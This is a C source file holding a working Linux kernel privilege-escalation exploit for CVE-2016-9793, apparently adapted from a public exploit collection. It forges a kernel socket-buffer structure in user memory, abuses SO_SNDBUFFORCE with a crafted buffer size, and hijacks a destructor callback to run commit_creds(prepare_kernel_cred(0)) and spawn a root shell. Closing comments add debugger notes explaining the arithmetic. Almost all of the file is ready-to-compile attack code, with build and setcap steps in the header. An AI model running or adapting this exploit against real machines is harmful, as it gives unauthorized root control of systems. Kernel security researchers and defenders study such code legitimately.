// https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
// gcc -pthread exploit.c -o exploit
// setcap cap_net_admin+ep ./exploit
#define _GNU_SOURCE

#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>

#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define COMMIT_CREDS 0xffffffff810a4820  		// 0xffffffff810a4b80 ffffffff810a4820 T commit_creds
#define PREPARE_KERNEL_CRED 0xffffffff810a4c10  // 0xffffffff810a4f30 ffffffff810a4c10 T prepare_kernel_cred

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

void get_root(void) {
 	commit_creds(prepare_kernel_cred(0));
}

struct ubuf_info_t {
  uint64_t callback;        // void (*callback)(struct ubuf_info *, bool)
  uint64_t ctx;             // void *
  uint64_t desc;            // unsigned long
};

struct skb_shared_info_t {
  uint8_t  nr_frags;        // unsigned char
  uint8_t  tx_flags;        // __u8
  uint16_t gso_size;        // unsigned short
  uint16_t gso_segs;        // unsigned short
  uint16_t gso_type;        // unsigned short
  uint64_t frag_list;       // struct sk_buff *
  uint64_t hwtstamps;       // struct skb_shared_hwtstamps
  uint32_t tskey;           // u32
  uint32_t ip6_frag_id;     // __be32
  uint32_t dataref;         // atomic_t
  uint64_t destructor_arg;  // void *
  uint8_t  frags[16][17];   // skb_frag_t frags[MAX_SKB_FRAGS];
};

// sk_sndbuf = 0xffffff00 => skb_shinfo(skb) = 0x00000000fffffed0
#define SNDBUF 0xffffff00
#define SHINFO 0x00000000fffffed0

struct ubuf_info_t ubuf_info = {(uint64_t)&get_root, 0, 0};
//struct ubuf_info_t ubuf_info = {0xffffdeaddeadbeeful, 0, 0};
struct skb_shared_info_t *skb_shared_info = (struct skb_shared_info_t *)SHINFO;

#define SKBTX_DEV_ZEROCOPY (1 << 3)
// forge skb_shared_info at 0xfffffed0
void* skb_thr(void* arg) {
	while (1) {
		skb_shared_info->destructor_arg = (uint64_t)&ubuf_info;
		skb_shared_info->tx_flags |= SKBTX_DEV_ZEROCOPY;
	}
}

int sockets[2];

void *write_thr(void *arg) {
	// Write blocks until setsockopt(SO_SNDBUF).
	write(sockets[1], "\x5c", 1);
	if (getuid() == 0) {
		printf("[+] got r00t\n");
		execl("/bin/sh", "sh", NULL);
		perror("execl()");
	}
	printf("[-] something went wrong\n");
}

int main() {
	void *addr;
	int rv;
	uint32_t sndbuf;

	addr = mmap((void *)(SHINFO & 0xfffffffffffff000ul), 0x1000,
		PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,
		-1, 0);
	if (addr != (void *)(SHINFO & 0xfffffffffffff000ul)) {
		perror("mmap()");
		exit(EXIT_FAILURE);
	}

	printf("[.] userspace payload mmapped at %p\n", addr);
// Step 0: forge skb_shared_info at 0xfffffed0
 	pthread_t skb_th;
    rv = pthread_create(&skb_th, 0, skb_thr, NULL);
	if (rv != 0) {
		perror("pthread_create()");
		exit(EXIT_FAILURE);
	}
    usleep(10000);
	printf("[.] overwriting thread started\n");
// Step 1: create 2 sockets to send and receive
	rv = socketpair(AF_LOCAL, SOCK_STREAM, 0, &sockets[0]);
	if (rv != 0) {
		perror("socketpair()");
		exit(EXIT_FAILURE);
	}
	printf("[.] sockets opened\n");
// Step 2: set sk_sndbuf = 0xFFFFFE00
	sndbuf = SNDBUF;
	rv = setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUFFORCE,
			&sndbuf, sizeof(sndbuf));
	if (rv != 0) {
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}
	printf("[.] sock->sk_sndbuf set to 0x%x\n", SNDBUF * 2);
// Step 3: call write to set skb->head and skb->end
	pthread_t write_th;
	rv = pthread_create(&write_th, 0, write_thr, NULL);
	if (rv != 0) {
		perror("pthread_create()");
		exit(EXIT_FAILURE);
	}
	usleep(10000);
	printf("[.] writing to socket\n");

// Step 4:  Wake up blocked write.
	rv = setsockopt(sockets[1], SOL_SOCKET, SO_SNDBUF,
			&sndbuf, sizeof(sndbuf));
	if (rv != 0) {
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}
	usleep(10000);
// Step 5: release sockets to hijack control-flow
	close(sockets[0]);
	close(sockets[1]);
	void *status;
	pthread_join(write_th, &status);

	return 0;
}

/*
(1) sk->sk_sndbuf
b net/core/sock.c:717

		sk->sk_userlocks |= SOCK_SNDBUF_LOCK;
		sk->sk_sndbuf = max_t(u32, val * 2, SOCK_MIN_SNDBUF);
		sk->sk_write_space(sk);
		break;
result:
	→ 0xffffffff817700e8 <sock_setsockopt+776> mov    DWORD PTR [r12+0x128], r14d		// sk->sk_sndbuf = 0xfffffe00
	$r14   : 0x00000000fffffe00
	$r12   : 0xffff88000f8a1000

(2) data_len
b net/unix/af_unix.c:1871
	while (sent < len) {
		size = len - sent;
		size = min_t(int, size, (sk->sk_sndbuf >> 1) - 64);
		size = min_t(int, size, SKB_MAX_HEAD(0) + UNIX_SKB_FRAGS_SZ);
		data_len = max_t(int, 0, size - SKB_MAX_HEAD(0));
		data_len = min_t(size_t, size, PAGE_ALIGN(data_len));
		skb = sock_alloc_send_pskb(sk, size - data_len, data_len,
					   msg->msg_flags & MSG_DONTWAIT, &err,
					   get_order(UNIX_SKB_FRAGS_SZ));
results:
	size - data_len = 0xFFFFFEC0

(3) skb->head   skb->end
b net/core/skbuff.c:229
	skb->head = data;
	skb->data = data;
	skb_reset_tail_pointer(skb);
	skb->end = skb->tail + size;
gef➤  p/x &(*(struct sk_buff *)0)->end
$5 = 0xcc

   0xffffffff81772017 <__alloc_skb+247>:	mov    DWORD PTR [rbx+0xcc],r8d

result:
	skb->head=0x10  skb->end=0xfffffec0

gef➤  p/x &(*(struct skb_shared_info *)0)->destructor_arg
$6 = 0x28

*/